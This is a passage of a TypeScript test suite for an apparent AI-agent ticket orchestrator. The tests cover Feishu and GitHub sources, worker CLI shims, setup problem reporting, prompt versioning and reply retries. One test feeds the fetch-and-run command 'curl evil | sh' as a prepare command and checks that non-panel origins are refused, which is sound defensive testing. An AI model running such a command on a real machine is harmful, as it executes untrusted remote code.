it('keeps pages of Source reads, prompt previews and Feishu message links in memory, outside the kv area', async () => {
  const message = feishu('30', '随便说说', { mentions: [] })
  await receive(message)
  const link = 'https://applink.feishu.cn/client/message/link/open?token=t30'
  vi.mocked(Commands.prototype.lark).mockResolvedValue({ messages: [{ message_id: 'om_30', chat_id: CHAT, message_app_link: link }] })
  expect(await runTool(runtime.masterId, 'orchestrator_read', { resource: `trigger/${message.id}` })).toMatchObject({ source_url: link })
  // AppLink 通过自 dsh-superagent 启动以来读取的链接找到。
  expect((await api('GET', `search?q=${encodeURIComponent(link)}`)).body).toMatchObject({ items: [expect.objectContaining({ id: message.id })] })
  const config = runtime.prompts.current().config
  const { previews } = await runTool(runtime.masterId, 'orchestrator_prompts_save', { config, preview: true }) as { previews: { read: string }[] }
  expect(await runTool(runtime.masterId, 'orchestrator_read', { resource: previews[0]!.read, offset: 4000 })).toMatchObject({ offset: 4000 })
  expect(runtime.store.keys('').filter(name => /-read:|source-link:|prompt-preview\//.test(name))).toEqual([])
})

it('reads resources recorded under the pre-vocabulary names', async () => {
  const { ticket, trigger, sessionId } = await acceptedTicket()
  expect(await runTool(sessionId, 'orchestrator_read', { resource: `event/${trigger.id}` })).toMatchObject({ trigger_id: trigger.id })
  expect(await runTool(sessionId, 'orchestrator_read', { resource: `task/${ticket.id}/assignment` })).toMatchObject({ resource: `ticket/${ticket.id}/assignment` })
})

it('leaves waiting and blocked assignments alone after a restart and keeps blocked workers paused', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'blocked', summary: 'need credentials' })
  runtime.executor.resume()
  expect(runtime.store.tickets.get(ticket.id)!.assignments).toHaveLength(1)
  expect(waitsForPerson(runtime.store.tickets.get(ticket.id)!)).toBe(true)
  const other = await acceptedTicket(feishu('12', '@bot 另一个', { root_id: undefined }))
  await runTool(other.sessionId, 'orchestrator_report', { state: 'progress', summary: 'midway' })
  runtime.executor.resume()
  expect(runtime.store.tickets.get(other.ticket.id)!.assignments.map(item => item.state)).toEqual(['ended', 'pending'])
})

it('starts with a broken GitHub record: the panel works, that record pauses, and other Sources keep running', async () => {
  const { sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'failed', summary: 'crashed' })
  expect(() => runtime.checkSetup()).toThrow('Setup is complete')
  controller.create.mockClear(); deliveries.mockClear()
  const next = await restart({}, { github: { cli: '' } })
  await next.ready
  next.sources.register(feishuKind); next.sources.register(githubKind)
  const problem = { place: 'github', code: 'agentCliUnset', values: {}, detail: 'The agent GitHub CLI is not set.' }
  // 机器级部署检查通过：只排除出问题的记录，其余来源照常运行。
  expect(next.configured()).toBe(true)
  expect(next.setupProblem).toBeUndefined()
  expect(next.sourceProblems).toEqual({ github: problem })
  expect(next.deployment.sources).not.toHaveProperty('github')
  expect(next.deployment.sources.feishu).toBeDefined()
  expect(next.health.runtime).toMatchObject({ state: 'ready' })
  expect((await api('GET', 'state')).body).toMatchObject({ setup: { problem: null, accounts: { repository: '', agent: '' }, machine: { stateDir: directory } } })
  // 概览和来源接口都说明是哪条记录失败了，而不是把它静默禁用。
  expect(overviewOf(next).problems[0]).toEqual({ kind: 'setup', ...problem })
  const sources = (await api('GET', 'sources')).body as { id: string; state: string; problem?: unknown }[]
  expect(sources.find(source => source.id === 'github')).toMatchObject({ state: 'error', problem })
  // 其他来源照常工作：飞书触发器仍被评估并交给主会话。
  await receive(feishu('30', '@bot 修一下'), next)
  expect(relays(next.masterId).some(item => item.trigger_id === feishu('30', '@bot 修一下').id)).toBe(true)
  // 机器级检查已通过，记录级问题不会让无关的策略保存重启运行时。
  // 不产生任何改变的保存同样不记录新修订。
  const revision = next.store.get<number>('settings-revision')
  expect(await next.settings.save('policy', next.store.settings().policy, next.store.blockRevision('policy'), 'panel')).toMatchObject({ saved: true, restarting: false })
  expect(next.store.get<number>('settings-revision')).toBe(revision)
  expect(await next.settings.save('policy', { ...next.store.settings().policy, rules: [] }, next.store.blockRevision('policy'), 'panel')).toMatchObject({ saved: true, restarting: false })
  expect(restarts).not.toHaveBeenCalled()
  // 在 dsh-superagent 外部修复后，下一次设置检查会重启运行时并重新解析记录。
  next.checkSetup()
  await vi.waitFor(() => expect(restarts).toHaveBeenCalledTimes(1))
})

it('reports each setup problem where the operator fixes it, and checks the agent CLI the way worker shells run it', async () => {
  const needs = async (place: string, code: string, values: Record<string, string>, accounts: Accounts = {}) => {
    const next = await restart({}, accounts)
    await next.ready
    // 机器级问题记在 setupProblem 上并停止全部来源；记录级问题只暂停那条记录。
    if (place === 'deployment') expect(next.setupProblem).toMatchObject({ place, code, values })
    else {
      expect(next.configured()).toBe(true)
      expect(next.sourceProblems[place]).toMatchObject({ place, code, values })
    }
  }
  answers[`${AGENT()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":false}\n'
  await needs('github', 'repositoryReadOnly', { account: 'agent-bot', repository: 'acme/widgets' })
  answers[`${AGENT()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":true}\n'
  // 智能体 CLI 在 worker 的环境中运行：PATH 上没有垫片，垫片会作为 spawn 环境条目传递。
  const check = subprocess.spawn.mock.calls.map(([spec]) => spec as { argv: string[]; env?: Record<string, string> }).find(spec => spec.argv.includes(AGENT()))!
  expect(check.argv[0]).toBe(AGENT())
  expect(check.env!.PATH!.split(delimiter)).not.toContain(join(directory, 'worker-bin'))
  const valid = { ...answers }
  // 低于 2.32 的 git 会忽略 GIT_CONFIG_GLOBAL，并读取操作者的配置。
  answers = { ...valid, [HELPERS]: 'file:/home/me/.gitconfig\0!gh auth git-credential\0' }
  await needs('deployment', 'gitTooOld', {})
  await needs('github', 'repositoryUnset', {}, { github: { repository: '' } })
  // 损坏的飞书机器人会把飞书排除在外并说明原因；GitHub 工作继续。
  answers = { ...valid, [`${BOT()} config strict-mode`]: 'strict-mode: off (source: profile)' }
  const next = await restart()
  await next.ready
  expect(next.configured()).toBe(true)
  expect(firstSource(next.deployment, 'feishu')).toBeUndefined()
  expect(next.feishuProblem).toMatchObject({ place: 'feishu', code: 'feishuUserIdentity', values: { mode: 'off' } })
})

it('reports a failure to write the agent environment as environmentFailed and leaves this process\'s environment as it was', async () => {
  await runtime.stop()
  // 无法创建垫片目录：一个文件占用了它的名字。
  rmSync(join(directory, 'worker-bin'), { recursive: true, force: true })
  writeFileSync(join(directory, 'worker-bin'), '')
  const environment = { ...process.env }
  const next = await restart()
  await next.ready
  expect(next.setupProblem).toMatchObject({ place: 'deployment', code: 'environmentFailed',
    values: { output: expect.stringContaining('EEXIST') } })
  expect(process.env).toEqual(environment)
})

it('checks only the account a Source save changes, so a problem setup has elsewhere does not refuse it', async () => {
  answers = { ...answers, [`${BOT()} config strict-mode`]: 'strict-mode: off (source: profile)' }
  const next = await restart()
  await next.ready
  expect(next.feishuProblem).toMatchObject({ code: 'feishuUserIdentity' })
  next.sources.register(feishuKind); next.sources.register(githubKind)
  answers[`${OTHER()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":true}\n'
  const github = next.settings.block('source:github')
  const value = github.value as { enabled: boolean; config: Record<string, unknown> }
  expect(await next.settings.save('source:github', { ...value, config: { ...value.config, cli: OTHER() } }, github.revision, 'panel'))
    .toMatchObject({ saved: true, restarting: true })
})

it('lets only the panel change the execution environment, since it decides what runs as a shell command and which CLIs workers reach', async () => {
  const executor = () => runtime.store.settings().executor
  const save = (value: Record<string, unknown>, origin: SettingsOrigin) => runtime.settings.save('executor', { ...executor(), ...value }, runtime.store.blockRevision('executor'), origin)
  for (const origin of ['tool', 'sync'] as const) {
    for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
  }
  expect(await save({ maxWorkers: 2 }, 'tool')).toMatchObject({ saved: true })
  expect(await save({ prepare: 'true' }, 'panel')).toMatchObject({ saved: true })
  expectTypeOf(runtime.settings.save).parameter(3).toEqualTypeOf<SettingsOrigin>()
  expectTypeOf(runtime.settings.pause).parameter(1).toEqualTypeOf<SettingsOrigin>()
})

it('checks a changed account CLI before saving it, restarts after the save, and lets only the panel change it', async () => {
  const save = (config: Record<string, unknown>, origin: SettingsOrigin = 'panel') => runtime.settings.save('source:github',
    { enabled: true, config: { ...runtime.store.settings().sources.github!.config, ...config } }, runtime.store.blockRevision('source:github'), origin)
  await expect(save({ cli: OTHER() }, 'tool')).rejects.toThrow('can only be changed in the management panel')
  answers[`${OTHER()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":false}\n'
  await expect(save({ cli: OTHER() })).rejects.toMatchObject({ code: 'repositoryReadOnly', values: { account: 'agent-bot' } })
  expect(restarts).not.toHaveBeenCalled()
  answers[`${OTHER()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":true}\n'
  expect(await save({ cli: OTHER() })).toMatchObject({ saved: true, restarting: true })
  await vi.waitFor(() => expect(restarts).toHaveBeenCalledTimes(1))
  // 来源的其他字段无需重启即可生效。
  expect(await save({ pollSeconds: 120 })).toMatchObject({ saved: true, restarting: false })
  expect(restarts).toHaveBeenCalledTimes(1)
  expect((await runtime.settings.save('executor', { ...runtime.store.settings().executor, prepare: 'true' }, runtime.store.blockRevision('executor'), 'panel')).restarting).toBe(false)
  // 账户检查期间对另一个块的保存会被保留：先运行检查，然后保存合并。
  const pending = save({ cli: AGENT() })
  await runtime.settings.save('policy', { ...runtime.store.settings().policy, rules: [] }, runtime.store.blockRevision('policy'), 'panel')
  await pending
  expect(runtime.store.settings().policy.rules).toEqual([])
  expect(runtime.store.settings().sources.github!.config).toMatchObject({ cli: AGENT() })
  const feishuSave = (cli: string) => runtime.settings.save('source:feishu', { enabled: true, config: { ...runtime.store.settings().sources.feishu!.config, cli } },
    runtime.store.blockRevision('source:feishu'), 'panel')
  expect(await feishuSave('')).toMatchObject({ restarting: true })
  answers[`${BOT()} config strict-mode`] = 'strict-mode: off (source: profile)'
  await expect(feishuSave(BOT())).rejects.toMatchObject({ code: 'feishuUserIdentity', values: { mode: 'off' } })
})

it('lists Tickets that wait on a person with where to answer them, as the overview does', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'need a decision', human_action: '按钮用哪种颜色？' })
  expect(ticketList(viewsOf(runtime), 'person', 0, 20).items).toEqual([expect.objectContaining({ id: ticket.id, stage: 'person', reply: expect.objectContaining({ source: 'feishu' }) })])
})

it('pauses and resumes processing as its own action, a setting outside every block, which keeps an Executor settings draft valid', async () => {
  const revision = runtime.store.blockRevision('executor')
  expect(await runtime.settings.pause(true, 'panel')).toEqual({ paused: true })
  expect(runtime.store.settings().paused).toBe(true)
  expect(runtime.store.blockRevision('executor')).toBe(revision)
  // 暂停前开始的执行器设置草稿仍可保存，并保留暂停；执行器块没有暂停。
  const draft = runtime.store.settings().executor
  await expect(runtime.settings.save('executor', { ...draft, paused: false }, revision, 'panel')).rejects.toThrow('paused')
  await runtime.settings.save('executor', { ...draft, maxWorkers: 5 }, revision, 'panel')
  expect(runtime.store.settings()).toMatchObject({ paused: true, executor: { maxWorkers: 5 } })
  // 编排器通过设置工具的暂停块以同样方式暂停和恢复。
  await runTool(runtime.masterId, 'orchestrator_settings_save', { block: 'pause', value: { paused: false }, revision: 0 })
  expect(runtime.store.settings().paused).toBe(false)
})

it('runs setup again while the Feishu bot check failed, and restores the process environment when git fails its check', async () => {
  answers[`${BOT()} config strict-mode`] = 'strict-mode: off (source: profile)'
  const next = await restart()
  await next.ready
  expect(next.configured()).toBe(true)
  expect(next.feishuProblem?.code).toBe('feishuUserIdentity')
  next.checkSetup()
  await vi.waitFor(() => expect(restarts).toHaveBeenCalledTimes(1))
  answers[HELPERS] = 'file:/home/me/.gitconfig\0!gh auth git-credential\0'
  const broken = await restart()
  await broken.ready
  expect(broken.setupProblem).toMatchObject({ place: 'deployment', code: 'gitTooOld' })
  expect(process.env.GIT_CONFIG_GLOBAL).toBeUndefined()
  expect(process.env.PATH?.split(':')).not.toContain(join(directory, 'worker-bin'))
})

it('writes worker shims that dispatch by Source record, and restores the environment on stop', async () => {
  const bin = join(directory, 'worker-bin')
  const records = () => JSON.parse(readFileSync(join(directory, 'worker-sources.json'), 'utf8')) as { clis: Record<string, { kind: string; cli: string }> }
  // 垫片不绑定任何记录：它把命令交给调度器，由调度器按工单目录选择该记录的 CLI。
  expect(readdirSync(bin).sort()).toEqual([shimFile('gh'), shimFile('lark-cli')])
  expect(readFileSync(join(bin, shimFile('lark-cli')), 'utf8')).toContain(workerDispatch(directory))
  expect(records().clis).toMatchObject({ github: { kind: 'github', cli: AGENT() }, feishu: { kind: 'feishu', cli: BOT() } })
  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, blockedCommands: ['personal-gh'] } })
  const next = await restart({}, { feishu: null })
  await next.ready
  expect(readdirSync(bin).sort()).toEqual([shimFile('gh'), shimFile('lark-cli'), shimFile('personal-gh')])
  expect(readFileSync(join(bin, shimFile('personal-gh')), 'utf8')).toContain("personal-gh is blocked in this installation; use gh, which acts on the ticket's Source record.")
  // 没有飞书记录时记录表不再提供 feishu，调度器于是让 lark-cli 以「没有 Feishu Source」失败。
  expect(records().clis).not.toHaveProperty('feishu')
  expect(readFileSync(workerDispatch(directory), 'utf8')).toContain('is unavailable: this installation has no ')
  expect(readFileSync(join(bin, shimFile('gh')), 'utf8')).toContain(workerDispatch(directory))
  // git 会在引号值中转义反斜杠；反转义它们，以便与捆绑包写入的辅助程序比较。
  expect(readFileSync(workerGitConfig(directory), 'utf8').replaceAll('\\\\', '\\')).toContain(`[credential "https://github.com"]\n\thelper = "${credentialHelper(directory)}"`)
  expect(process.env).toMatchObject({ GIT_CONFIG_GLOBAL: workerGitConfig(directory), GIT_CONFIG_NOSYSTEM: '1' })
  expect(process.env.GIT_AUTHOR_NAME).toBeUndefined()
  expect(process.env.PATH?.split(delimiter)[0]).toBe(bin)
  await next.stop()
  expect(process.env.GIT_CONFIG_GLOBAL).toBeUndefined()
  expect(process.env.PATH?.split(delimiter)).not.toContain(bin)
})

it('waits for setup when the shim directory holds a file dsh-superagent did not write, and leaves the file alone', async () => {
  writeFileSync(join(directory, 'worker-bin', 'my-script'), '#!/bin/sh\n')
  const next = await restart()
  await next.ready
  expect(next.configured()).toBe(false)
  expect(next.setupProblem).toMatchObject({ place: 'deployment', code: 'foreignFile', values: { file: join(directory, 'worker-bin', 'my-script') } })
  expect(readFileSync(join(directory, 'worker-bin', 'my-script'), 'utf8')).toBe('#!/bin/sh\n')
  await next.stop()
})

it('rewrites the blocked-command shims when the Executor settings change them, without a restart', async () => {
  const bin = join(directory, 'worker-bin')
  const save = (blockedCommands: string[]) => runtime.settings.save('executor', { ...runtime.store.settings().executor, blockedCommands }, runtime.store.blockRevision('executor'), 'panel')
  expect(await save(['personal-gh'])).toMatchObject({ saved: true, restarting: false })
  expect(readdirSync(bin).sort()).toEqual([shimFile('gh'), shimFile('lark-cli'), shimFile('personal-gh')])
  await save([])
  expect(readdirSync(bin).sort()).toEqual([shimFile('gh'), shimFile('lark-cli')])
  // worker 所需的命令无法被阻止。
  await expect(save(['gh'])).rejects.toThrow()
  expect(restarts).not.toHaveBeenCalled()
})

it('tells both roles the execution environment through a generated prompt section, and each worker its own ticket\'s', async () => {
  const preview = runtime.prompts.preview(runtime.prompts.current().config)
  const section = preview.parts.worker.at(-1)!
  expect(section.name).toBe('runtime/environment')
  for (const line of ['- DSH_SUPERAGENT_GITHUB_REPOSITORY = "acme/widgets"', '- DSH_SUPERAGENT_GITHUB_ACCOUNT = "agent-bot"', '- DSH_SUPERAGENT_GITHUB_COMMIT_EMAIL = "7+agent-bot@users.noreply.github.com"']) expect(section.text).toContain(line)
  expect(section.text).not.toContain('MERGE_ACCOUNT')
  // 工单之外没有工单目录。
  expect(section.text).not.toContain('DSH_SUPERAGENT_DIR')
  // 主会话的策略部分紧随其后。
  expect(preview.orchestrator).toContain(`${section.text}\n\n## 策略`)
  const { ticket, sessionId } = await acceptedTicket()
  expect(sections.get(sessionId)!.text({})).toContain(`- DSH_SUPERAGENT_DIR = ${JSON.stringify(ticket.execution!.directory)}`)
  expect(sections.get(runtime.masterId)!.text({})).not.toContain('DSH_SUPERAGENT_DIR')
  const next = await restart({}, { feishu: null })
  await next.ready
  expect(Object.keys(next.prompts.preview(next.prompts.current().config).skills)).not.toContain('feishu')
})

it('lets a worker read the prompt version it works under and the ones it worked under before, also after a restart, and no other', async () => {
  const { sessionId } = await acceptedTicket()
  const save = () => { const { config, revision } = runtime.prompts.current(); return runtime.prompts.save({ ...config, delivery: `${config.delivery}.` }, revision, 'panel').revision }
  // 模型请求会读取系统提示词，它会将会话绑定到当时的版本。
  const request = () => sections.get(sessionId)!.text({ signal: new AbortController().signal })
  const read = (resource: string) => runTool(sessionId, 'orchestrator_read', { resource })
  const first = save(), second = save()
  request()
  await expect(read(`prompts/${first}`)).rejects.toThrow('inaccessible prompt version')
  const third = save()
  // 在下一次请求之前，它按读取到的版本工作；之后，它仍可能读取那个版本。
  expect(await read('prompts/current')).toMatchObject({ resource: `prompts/${second}` })
  request()
  expect(await read('prompts/current')).toMatchObject({ resource: `prompts/${third}` })
  expect(await read(`prompts/${second}`)).toMatchObject({ resource: `prompts/${second}` })
  expect(runtime.sessions.status().sessions).toContainEqual({ sessionId, revision: third })
  const next = await restart()
  await next.ready
  expect([next.sessions.promptVersion(sessionId).revision, next.sessions.mayRead(sessionId, second), next.sessions.mayRead(sessionId, first)])
    .toEqual([third, true, false])
})

it('passes team text with template braces to every Session literally, without reading them as prompt variables', async () => {
  const delivery = 'Pin the build to ${{ github.sha }}; keep {{x}} as written.'
  const current = runtime.prompts.current()
  runtime.prompts.save({ ...current.config, delivery }, current.revision, 'panel')
  const { sessionId } = await acceptedTicket()
  for (const id of [runtime.masterId, sessionId]) {
    const section = sections.get(id)!
    const text = renderPrompt({ sections: [{ name: section.name, text: section.text({}), interpolate: section.interpolate }], contexts: [], tools: [], variables: {} })
    expect(text).toContain(delivery)
  }
})

it('leaves auto-merge to the delivery requirements, with the agent\'s own gh and the line threshold', async () => {
  const { ticket } = await acceptedTicket()
  expect(runtime.ticketEnvironment(ticket).map(variable => variable.key)).not.toContain('DSH_SUPERAGENT_GITHUB_MERGE_ACCOUNT')
  expect(ticket.mandate).not.toHaveProperty('autoMergeLineLimit')
  const delivery = runtime.prompts.current().config.delivery
  expect(delivery).toContain('改动少于 200 行（新增数加删除数）；')
  // 自动合并从不以智能体账户启用；只有该部分点名的合并 CLI 才能启用它。
  expect(delivery).toContain('绝不要以 agent 账户启用自动合并')
  expect(delivery).toContain('<merge CLI> pr merge <number> --auto --merge --match-head-commit <sha>')
  expect(runtime.prompts.preview(runtime.prompts.current().config).worker).not.toContain('gh-merge')
})

it('runs the prepare command once for a new ticket, under the execution root with the ticket\'s environment, and fails the ticket with its output', async () => {
  const prepare = (command: string) => runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, prepare: command } })
  const runs = () => subprocess.spawn.mock.calls.map(([spec]) => spec as { argv: string[]; cwd: string; env?: Record<string, string> }).filter(spec => spec.argv[0] === shellArgv('')[0])
  prepare('git -C /srv/widgets worktree add "$DSH_SUPERAGENT_DIR" -b "agent/$DSH_SUPERAGENT_NAME"')
  const { ticket } = await acceptedTicket()
  expect(runs()).toEqual([expect.objectContaining({ argv: shellArgv('git -C /srv/widgets worktree add "$DSH_SUPERAGENT_DIR" -b "agent/$DSH_SUPERAGENT_NAME"'), cwd: join(directory, 'work'),
    env: expect.objectContaining({ DSH_SUPERAGENT_DIR: ticket.execution!.directory, DSH_SUPERAGENT_NAME: ticket.execution!.name, DSH_SUPERAGENT_SOURCE: 'feishu', DSH_SUPERAGENT_FEISHU_CHAT: CHAT }) })])
  // 重试会复用已准备好的目录。
  await runTool(`worker-${ticket.id}`, 'orchestrator_report', { state: 'failed', summary: 'offline' })
  await runtime.engine.retryTicket(ticket.id)
  await runtime.idle()
  expect(runs()).toHaveLength(1)
  answers[shellArgv('exit 3').join(' ')] = new Error('fatal: no such clone')
  prepare('exit 3')
  const failed = await acceptedTicket(feishu('9', '@bot 修一下标题'))
  await runtime.idle()
  expect(runtime.store.tickets.get(failed.ticket.id)!.assignments.at(-1)).toMatchObject({ report: expect.objectContaining({ state: 'failed', summary: expect.stringContaining('The prepare command failed: fatal: no such clone') }) })
  expect(waitsForPerson(runtime.store.tickets.get(failed.ticket.id)!)).toBe(true)
})

it('counts a ticket whose directory the host prepared before prepare commands existed as prepared', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'failed', summary: 'offline' })
  // 来自 prepare 命令之前的工单有其工作树。
  const stored = runtime.store.tickets.get(ticket.id)!
  runtime.store.tickets.save({ ...stored, execution: { ...stored.execution!, directory } })
  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, prepare: 'exit 1' } })
  subprocess.spawn.mockClear()
  await runtime.engine.retryTicket(ticket.id)
  await runtime.idle()
  expect(subprocess.spawn.mock.calls.some(([spec]) => spec.argv[0] === shellArgv('')[0])).toBe(false)
  expect(runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.state).toBe('running')
})

it('runs a GitHub-only deployment: the GitHub part of the Policy decides alone, and the Feishu part has nothing to sync', async () => {
  const next = await restart({}, { feishu: null })
  await next.ready
  expect(next.health).not.toHaveProperty('feishu')
  expect(next.health).not.toHaveProperty('sync:feishu')
  const problems = () => overviewOf(next).problems
  const unregister = next.sources.register(githubKind)
  expect(next.health.github).toEqual({ state: 'starting', detail: '' })
  const policy = next.store.settings().policy
  await next.settings.save('policy', { ...policy, sources: {} }, next.store.blockRevision('policy'), 'panel')
  expect(problems()).toContainEqual({ kind: 'no-allowed' })
  await next.settings.save('policy', { ...policy, sources: { github: { allowed: [{ id: 'bob' }] } } }, next.store.blockRevision('policy'), 'panel')
  expect(next.store.settings().policy.sources).toEqual({ github: { allowed: [{ id: 'bob' }], admission: {} } })
  expect(problems()).not.toContainEqual({ kind: 'no-allowed' })
  await expect(next.settings.save('policy', { ...next.store.settings().policy, sources: { github: { allowed: [{ name: 'Nobody' }] } } }, next.store.blockRevision('policy'), 'panel')).rejects.toThrow()
  await expect(next.settings.sync('feishu')).rejects.toThrow('nothing to sync from')
  unregister()
  expect(next.health).not.toHaveProperty('github')
})


it('credits each human reviewer once in the default delivery requirements on every commit of the PR, never with an empty commit', async () => {
  const delivery = runtime.prompts.current().config.delivery
  expect(delivery).toContain('Co-authored-by: <name or login> <id+login@users.noreply.github.com>')
  expect(delivery).toContain('在该 PR 分支的每个提交上')
  expect(delivery).toContain('git filter-branch -f --msg-filter')
  expect(delivery).toContain('绝不要为了给审查者记功而推送空提交。')
  expect(delivery).toContain('不要给 bot')
})

it('shows a failed reply as a problem with its attempts, an error of the reply effects after three, until it is withdrawn', async () => {
  const { trigger } = await acceptedTicket()
  vi.spyOn(Commands.prototype, 'lark').mockRejectedValue(new Error('internal error (2200)'))
  runtime.outbox.send({ id: 'stuck', channel: trigger.channel!, text: '已合并。', kind: 'notice' })
  const outgoing = () => overviewOf(runtime).problems.filter(problem => problem.kind === 'outgoing')
  const at = async (ms: number) => {
    vi.useFakeTimers({ toFake: ['Date'], now: Date.now() + ms })
    try { await runtime.sendReplies() } finally { vi.useRealTimers() }
  }
  await runtime.sendReplies()
  expect(outgoing()).toEqual([{ kind: 'outgoing', outgoing: expect.objectContaining({ id: 'stuck', attempts: 1, error: expect.stringContaining('2200') }) }])
  expect(runtime.health.reply).toMatchObject({ state: 'ready', detail: expect.stringContaining('1 waiting') })
  // 其重试会在 5 秒后、再 10 秒后进行。
  await at(5000); await at(15_000)
  expect(runtime.health.reply).toMatchObject({ state: 'error', detail: expect.stringContaining('2200') })
  expect(runtime.health.runtime).toMatchObject({ state: 'ready' })
  // 被撤回的回复会连同其效果一起撤销，从而立即清除错误。
  runtime.outbox.withdraw('stuck')
  expect([outgoing(), runtime.health.reply, runtime.effects.pending('reply', 'stuck')])
    .toEqual([[], expect.objectContaining({ state: 'ready', detail: 'Nothing waiting' }), false])
})

describe('the order of a Ticket\'s messages to one conversation', () => {
  const sent: string[] = []
  const refused = new Set<string>()
  const message = (id: string, ticketId: string, channel = feishuChannel('feishu', CHAT, 'om_1')) => ({ id, channel, text: id, kind: 'reply' as const, ticketId })
  const at = async (ms: number) => {
    vi.useFakeTimers({ toFake: ['Date'], now: Date.now() + ms })
    try { await runtime.sendReplies() } finally { vi.useRealTimers() }
  }
  beforeEach(async () => {
    sent.length = 0; refused.clear()
    await acceptedTicket()
    vi.spyOn(runtime.sources, 'send').mockImplementation(async message => {
      if (refused.has(message.id)) throw new Error('internal error (2200)')
      sent.push(message.id)
      return 'sent'
    })
  })
  it('sends a Ticket\'s later result after its acknowledgement that failed once, and holds no other Ticket\'s message in the chat', async () => {
    refused.add('ack-a')
    runtime.outbox.send(message('ack-a', 'a'))
    await runtime.sendReplies()
    refused.delete('ack-a')
    runtime.outbox.send(message('result-a', 'a'))
    // 同一聊天中的另一个工单，以及 Issue 中的同一工单，是其他订单。
    runtime.outbox.send(message('ack-b', 'b', feishuChannel('feishu', CHAT, 'om_2')))
    runtime.outbox.send(message('issue-a', 'a', githubChannel('github', 7)))
    await runtime.sendReplies()
    expect([runtime.outbox.status('result-a'), sent]).toEqual(['pending', ['ack-b', 'issue-a']])
    await at(5000)
    expect(sent).toEqual(['ack-b', 'issue-a', 'ack-a', 'result-a'])
  })
  it('stops holding a Ticket\'s later messages behind one that failed three times, which the overview shows', async () => {
    refused.add('ack-a')
    runtime.outbox.send(message('ack-a', 'a'))
    await runtime.sendReplies()
    runtime.outbox.send(message('result-a', 'a'))
    // 其重试会在 5 秒后、再 10 秒后进行；第三次失败会释放结果。
    await at(5000)
    expect(sent).toEqual([])
    await at(15_000)
    expect(sent).toEqual(['result-a'])
    expect(overviewOf(runtime).problems).toContainEqual({ kind: 'outgoing', outgoing: expect.objectContaining({ id: 'ack-a', attempts: 3 }) })
  })
})

it('keeps the receipt of a message withdrawn while it went out, so its id is not queued again', async () => {
  const { trigger } = await acceptedTicket()
  vi.spyOn(runtime.sources, 'send').mockImplementation(async message => { runtime.outbox.withdraw(message.id); return 'sent' })
  runtime.outbox.send({ id: 'raced', channel: trigger.channel!, text: 'Done', kind: 'reply' })
  await runtime.sendReplies()
  runtime.outbox.send({ id: 'raced', channel: trigger.channel!, text: 'Again', kind: 'reply' })
  expect([runtime.store.receipts.get('raced'), runtime.effects.pending('reply')]).toEqual([expect.objectContaining({ text: 'Done', status: 'sent' }), false])
})

it('resumes several ended tickets on one thread from one message without the launch waiting on itself', async () => {
  const first = await acceptedTicket()
  const other = feishu('30', '@bot 顺手把这里也改了', { root_id: undefined })
  await receive(other)
  await route({ kind: 'attach', ticket_id: first.ticket.id, trigger_id: other.id })
  // 第一个工单线程上的请求会在第一个工单的 worker 交回后成为那里的第二个工单。
  const another = feishu('31', '@bot 另一件事', { root_id: 'om_1' })
  await receive(another)
  await runTool(first.sessionId, 'orchestrator_trigger_handback', { trigger_id: another.id, reason: 'Another change.' })
  const second = await acceptedTicket(another)
  for (const ticket of [first, second]) await runTool(ticket.sessionId, 'orchestrator_report', { state: 'dropped', summary: 'nothing to do' })
  await receive(feishu('32', '还有问题', { mentions: [], root_id: 'om_1', sender_id: 'ou_guest' }))
  await vi.waitFor(() => expect([first, second].map(ticket => runtime.store.tickets.get(ticket.ticket.id)!.ended)).toEqual([undefined, undefined]), { timeout: 3000 })
  await vi.waitFor(() => expect([first, second].map(ticket => runtime.store.tickets.get(ticket.ticket.id)!.assignments.at(-1)!.state)).toEqual(['running', 'running']), { timeout: 3000 })
})

it('attaches a message to an ended ticket and so resumes it', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'dropped', summary: 'nothing to do' })
  const other = feishu('40', '@bot 上次那个改动还要改一下', { root_id: undefined })
  await receive(other)
  await route({ kind: 'attach', ticket_id: ticket.id, trigger_id: other.id })
  await vi.waitFor(() => expect(runtime.store.tickets.get(ticket.id)!.ended).toBeUndefined())
  expect(runtime.store.tickets.get(ticket.id)!.assignments).toHaveLength(2)
})

it('rereads a Source\'s display names on request, reports the new ones and keeps the list when the read fails', async () => {
  runtime.store.set('source-labels:feishu', { oc_team: 'Team' })
  const lark = vi.spyOn(Commands.prototype, 'lark').mockResolvedValue({ chats: [{ chat_id: 'oc_team', name: 'Team' }, { chat_id: 'oc_new', name: 'New chat' }] })
  expect(await runtime.settings.refreshLabels('feishu')).toEqual({ added: ['New chat'] })
  expect(lark).toHaveBeenCalledWith(['im', '+chat-list', '--page-all', '--page-size', '100'])
  expect(runtime.store.get('source-labels:feishu')).toEqual({ oc_team: 'Team', oc_new: 'New chat' })
  lark.mockRejectedValue(new Error('token expired'))
  await expect(runtime.settings.refreshLabels('feishu')).rejects.toThrow('token expired')
  expect(runtime.store.get('source-labels:feishu')).toEqual({ oc_team: 'Team', oc_new: 'New chat' })
  await expect(runtime.settings.refreshLabels('github')).rejects.toThrow('no names to refresh')
})

it('drops a message only when its conversation is gone or not listened to, newest drop first, and keeps it while its Source is off', async () => {
  const channel = feishu('7', 'x').channel!
  // 不属于任何工单的消息不保留顺序，因此没有消息会排在另一个之后。
